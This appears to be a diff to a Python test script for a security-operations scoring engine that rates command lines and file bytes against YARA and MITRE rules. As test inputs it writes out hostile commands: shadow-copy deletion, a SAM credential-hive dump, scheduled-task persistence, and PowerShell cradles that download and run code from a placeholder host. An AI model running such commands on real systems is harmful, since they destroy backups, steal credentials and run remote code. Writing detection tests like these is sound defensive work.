@@ -68,6 +68,17 @@ results.append(check("sha256 syslog", behavior._extract_sha256(f7),
 f8 = {"data": {"hash_sha256": "$exec.all_fields.data.hash_sha256"}}
 results.append(check("sha256 unsubstituted", behavior._extract_sha256(f8), ""))
 
+# 8b) Wazuh FIM 'file added' (syscheck.sha256_after) — NO agent script needed.
+f8b = {"syscheck": {"path": "C:\\Windows\\Temp\\a.exe",
+       "sha256_after": "1111111111111111111111111111111111111111111111111111111111111111"}}
+results.append(check("sha256 FIM syscheck", behavior._extract_sha256(f8b),
+                     "1111111111111111111111111111111111111111111111111111111111111111"))
+
+# 8c) File-drop collector direct field (data.sha256)
+f8c = {"data": {"sha256": "2222222222222222222222222222222222222222222222222222222222222222"}}
+results.append(check("sha256 collector", behavior._extract_sha256(f8c),
+                     "2222222222222222222222222222222222222222222222222222222222222222"))
+
 # 9) Non-encoded but suspicious flags (legit-ish admin script) → score 40.
 # With the [40,20] reviewed tier this now floors at 20 (reviewed) — intended:
 # low-confidence TTPs are surfaced to the analyst, never auto-actioned.
@@ -121,12 +132,13 @@ results.append(check("hybrid yara>mitre floor (escalate)",
                      behavior.behavior_floor(b17["behavior_score"]), 90))
 
 # ── LOLBin YARA ruleset (Phase 9.1, requires yara + soc-lolbin-behavior.yar) ──
-# 18) schtasks persistence via command_line YARA (no MITRE) → 45 → reviewed
+# 18) schtasks persistence via command_line YARA (no MITRE) → 50 → auto_promoted
+#     (score bumped 45→50 in commit 43b2baa: schtasks/runkey auto_promoted)
 b18 = behavior.compute_behavior(
     'SCHTASKS  /Create /S localhost /RU DOMAIN\\user /RP At0micStrong '
     '/TN "Atomic task" /TR "C:\\windows\\system32\\cmd.exe" /SC daily /ST 20:10')
 print("  matches18:", b18["yara_matches"])
-results.append(check("lolbin-schtasks score", b18["behavior_score"], 45))
+results.append(check("lolbin-schtasks score", b18["behavior_score"], 50))
 
 # 19) vssadmin shadow delete → critical → escalate
 b19 = behavior.compute_behavior("vssadmin delete shadows /all /quiet")
@@ -136,6 +148,95 @@ results.append(check("lolbin-vssadmin score", b19["behavior_score"], 90))
 # 20) reg save SAM hive dump → critical
 b20 = behavior.compute_behavior("reg save hklm\\sam C:\\temp\\sam.hive")
 results.append(check("lolbin-reghive score", b20["behavior_score"], 90))
+
+# ── Phase 9.2 — file-drop / shimming categorization ──────────────────────────
+# NB on MITRE: _mitre_score is intentionally CONSERVATIVE — max(techniques+tactics)
+# (case #10 relies on this). So a technique pin only wins when the tactic is absent
+# or lower. T1546.011=45 de-noises shimming ONLY for rules that emit just the id.
+
+# 21a) Native shim, rule emits MITRE id WITHOUT a tactic → T1546.011=45 alone →
+#      behavior 45 → floor 20 → REVIEWED (visible, no case). The de-noise win for
+#      id-only rules: previously base T1546=55 floored at 50 → auto_promoted.
+b21 = behavior.compute_behavior(
+    r"C:\Windows\System32\sdbinst.exe -q C:\Windows\AppPatch\Custom\app.sdb",
+    ["T1546.011"], [])
+print("  matches21:", b21["yara_matches"], "score:", b21["behavior_score"])
+results.append(check("shim-native id-only score", b21["behavior_score"], 45))
+results.append(check("shim-native id-only floor (reviewed)",
+                     behavior.behavior_floor(b21["behavior_score"]), 20))
+
+# 21b) Same native shim but the rule ALSO tags the Persistence tactic (50). The
+#      conservative floor wins → 50 → auto_promoted (a low-priority case, tagged
+#      shimming). Honest limitation: pure MITRE cannot push this below the tactic
+#      floor; true silencing would need Wazuh-level suppression (declined).
+b21b = behavior.compute_behavior(
+    r"C:\Windows\System32\sdbinst.exe -q C:\Windows\AppPatch\Custom\app.sdb",
+    ["T1546.011"], ["Persistence"])
+results.append(check("shim-native +tactic score", b21b["behavior_score"], 50))
+
+# 22) ABUSIVE shim: sdbinst installing a .sdb from a user-writable path → YARA
+#     Application_Shimming_Suspicious=60 → floor 50 → auto_promoted (case).
+b22 = behavior.compute_behavior(
+    r"sdbinst.exe -q C:\Users\bob\AppData\Local\Temp\evil.sdb",
+    ["T1546.011"], ["Persistence"])
+print("  matches22:", b22["yara_matches"], "score:", b22["behavior_score"])
+results.append(check("shim-abusive score", b22["behavior_score"], 60))
+results.append(check("shim-abusive floor (auto_promoted)",
+                     behavior.behavior_floor(b22["behavior_score"]), 50))
+
+# 23) Local file-drop WITHOUT a download cradle: WriteAllBytes a PE into System32
+#     (e.g. self-unpacking malware). PS_Download_Cradle does NOT fire (no net) →
+#     the NEW Dropper_Executable_In_System_Dir=65 is the categorizing signal →
+#     floor 50 → auto_promoted. This is the genuine coverage gap this rule fills.
+b23 = behavior.compute_behavior(
+    r"powershell -nop -c [IO.File]::WriteAllBytes('C:\Windows\System32\svc2.exe',$bytes)")
+print("  matches23:", b23["yara_matches"], "score:", b23["behavior_score"])
+results.append(check("dropper-windir-nonet score", b23["behavior_score"], 65))
+results.append(check("dropper-windir-nonet floor (auto_promoted)",
+                     behavior.behavior_floor(b23["behavior_score"]), 50))
+
+# 24) Download-based drop into a Windows dir → both Dropper_Executable_In_System_Dir
+#     (65) AND the pre-existing PS_Download_Cradle (75) fire → max 75 → contained.
+#     The download cradle dominates; the drop rule adds the system-dir tag/context.
+b24 = behavior.compute_behavior(
+    r"powershell -nop -c (New-Object Net.WebClient)."
+    r"DownloadFile('http://x/a.exe','C:\Windows\Temp\a.exe')")
+print("  matches24:", b24["yara_matches"], "score:", b24["behavior_score"])
+results.append(check("dropper-windir-download score", b24["behavior_score"], 75))
+results.append(check("dropper-windir-download floor (contained)",
+                     behavior.behavior_floor(b24["behavior_score"]), 75))
+
+# ── Phase 9.2 — compute_behavior_bytes (/analyze-file raw-bytes scan) ─────────
+# 25) Binary PE with injection imports → YARA on BYTES matches (a utf-8 decode
+#     would have mangled it) → 70 → contained verdict.
+pe_inject = (b"MZ" + b"\x90" * 64 + b"PE\x00\x00" +
+             b"....VirtualAllocEx....WriteProcessMemory....CreateRemoteThread....")
+b25 = behavior.compute_behavior_bytes(pe_inject)
+print("  bytes25:", b25["yara_matches"], "score:", b25["behavior_score"])
+results.append(check("filebytes-pe-inject score", b25["behavior_score"], 70))
+results.append(check("filebytes-pe-inject floor (contained)",
+                     behavior.behavior_floor(b25["behavior_score"]), 75))
+
+# 26) Clean PE (no suspicious strings) → 0 → auto_closed verdict (SOAR closes it).
+pe_clean = b"MZ" + b"\x00" * 200 + b"Microsoft Corporation\x00msvcrt.dll\x00printf\x00"
+b26 = behavior.compute_behavior_bytes(pe_clean)
+print("  bytes26:", b26["yara_matches"], "score:", b26["behavior_score"])
+results.append(check("filebytes-pe-clean score", b26["behavior_score"], 0))
+results.append(check("filebytes-pe-clean floor (auto_closed)",
+                     behavior.behavior_floor(b26["behavior_score"]), 0))
+
+# 27) Script dropper file content (text bytes) → embedded dropper + download cradle
+#     fire → 75 → contained.
+b27 = behavior.compute_behavior_bytes(
+    b"$b=[Convert]::FromBase64String($enc); "
+    b"IEX (New-Object Net.WebClient).DownloadString('http://x/p.ps1')")
+print("  bytes27:", b27["yara_matches"], "score:", b27["behavior_score"])
+results.append(check("filebytes-script-dropper score", b27["behavior_score"], 75))
+
+# 28) Round-trip through the /analyze-file decode path: base64 → bytes → scan.
+import base64 as _b64
+b28 = behavior.compute_behavior_bytes(_b64.b64decode(_b64.b64encode(pe_inject)))
+results.append(check("filebytes-b64-roundtrip score", b28["behavior_score"], 70))
 
 print(f"\n{sum(results)}/{len(results)} PASS")
 exit(0 if all(results) else 1)
